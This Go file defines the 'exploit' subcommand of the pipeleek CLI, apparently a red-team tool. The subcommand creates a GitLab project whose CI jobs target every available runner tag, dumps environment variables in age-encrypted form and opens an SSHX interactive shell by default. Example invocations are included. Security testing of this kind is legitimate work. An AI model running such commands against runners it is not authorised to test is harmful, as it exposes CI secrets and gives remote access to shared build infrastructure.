package exploit

import (
	"github.com/CompassSecurity/pipeleek/pkg/config"
	pkgrunners "github.com/CompassSecurity/pipeleek/pkg/gitlab/runners/exploit"
	"github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
)

func NewRunnersExploitCmd() *cobra.Command {
	var runnerTags []string
	var ageEncryptionPublicKey string
	var repoName string
	var dry bool
	var shell bool

	exploitCmd := &cobra.Command{
		Use:   "exploit",
		Short: "Create project with CI/CD jobs to exploit available runners",
		Long:  "Creates a project, generates a job per available runner tag and runs a default .gitlab-Ci.yml definition which can be customized for exploitation.",
		Example: `
# Creates a project with jobs for all available runners with the tags docker, shared. Dumps the envs encrypted using Age and starts an interactive SSHX shell,
pipeleek gl runners exploit --token glpat-xxxxxxxxxxx --gitlab https://gitlab.mydomain.com --tags docker,shared --age-public-key age1... --repo-name my-exploit-repo --dry=false --shell=true

# Print the generated .gitlab-ci.yml only, does NOT create a project or jobs
pipeleek gl runners exploit --token glpat-xxxxxxxxxxx --gitlab https://gitlab.mydomain.com --dry=true --shell=true
 		`,
		Run: func(cmd *cobra.Command, args []string) {
			if err := config.BindCommandFlags(cmd, "gitlab.runners.exploit", nil); err != nil {
				log.Fatal().Err(err).Msg("Failed to bind flags to config")
			}

			// Get gitlab URL and token from parent's vars (set by parent PersistentPreRun)
			gitlabUrl, _ := cmd.Flags().GetString("gitlab")
			gitlabApiToken, _ := cmd.Flags().GetString("token")

			// Get values from config (supports CLI flags, config file, and env vars)
			if !cmd.Flags().Changed("tags") {
				runnerTags = config.GetStringSlice("gitlab.runners.exploit.tags")
			}
			if !cmd.Flags().Changed("age-public-key") {
				ageEncryptionPublicKey = config.GetString("gitlab.runners.exploit.age_public_key")
			}
			if !cmd.Flags().Changed("repo-name") {
				repoName = config.GetString("gitlab.runners.exploit.repo_name")
			}
			if !cmd.Flags().Changed("dry") {
				dry = config.GetBool("gitlab.runners.exploit.dry")
			}
			if !cmd.Flags().Changed("shell") {
				shell = config.GetBool("gitlab.runners.exploit.shell")
			}

			pkgrunners.ExploitRunners(runnerTags, dry, shell, gitlabApiToken, gitlabUrl, ageEncryptionPublicKey, repoName)
			log.Info().Msg("Done, Bye Bye üè≥Ô∏è‚Äçüåàüî•")
		},
	}

	exploitCmd.Flags().StringSliceVarP(&runnerTags, "tags", "", []string{}, "Jobs with the following tags are created")
	exploitCmd.Flags().StringVarP(&ageEncryptionPublicKey, "age-public-key", "", "", "An age public key generated with ./age-keygen -o key.txt (repo: https://github.com/FiloSottile/age). Prints the encrypted environment variables in the output log.")
	exploitCmd.Flags().StringVarP(&repoName, "repo-name", "", "pipeleek-runner-test", "The name for the created repository")
	exploitCmd.PersistentFlags().BoolVarP(&dry, "dry", "d", false, "Only generate and print the .gitlab-ci.yml, do NOT create real jobs")
	exploitCmd.PersistentFlags().BoolVarP(&shell, "shell", "s", true, "Add an SSHX interactive shell to the jobs")

	return exploitCmd
}
